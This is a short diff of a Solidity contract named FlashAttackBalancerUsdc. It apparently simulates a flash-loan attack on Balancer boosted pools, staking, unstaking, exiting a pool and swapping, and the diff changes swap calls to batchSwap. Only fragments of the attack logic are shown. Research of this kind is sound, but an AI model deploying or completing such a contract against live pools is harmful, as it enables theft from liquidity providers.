@@ -112,7 +112,7 @@ contract FlashAttackBalancerUsdc is FlashLoanReceiverBase {
 
         _stake(address(usdc), amount);
 
-        showBalances('Stake 10kk');
+        showBalances('Stake');
 
         _unstakeToken(address(amDai), bpt.balanceOf(address(this)) / 2);
         showBalances('Unstake DAI');
@@ -174,15 +174,13 @@ contract FlashAttackBalancerUsdc is FlashLoanReceiverBase {
 
         require(_asset == address(usdc), "Some token not compatible");
 
-        BalancerLibrary.swap(
+        BalancerLibrary.batchSwap(
             vault,
-            IVault.SwapKind.GIVEN_IN,
             address(usdc),
             address(bbamUsdc),
             bbamUsdcPoolId,
             _amount,
             0,
-            address(this),
             address(this)
         );
 
@@ -257,15 +255,13 @@ contract FlashAttackBalancerUsdc is FlashLoanReceiverBase {
         vault.exitPool(bbamUsdPoolId, address(this), payable(address(this)), request);
 
         // 3. Swap
-        BalancerLibrary.swap(
+        BalancerLibrary.batchSwap(
             vault,
-            IVault.SwapKind.GIVEN_IN,
             address(bbamToken),
             _asset,
             bbamTokenPoolId,
             bbamToken.balanceOf(address(this)) / 2,
             0,
-            address(this),
             address(this)
         );
 
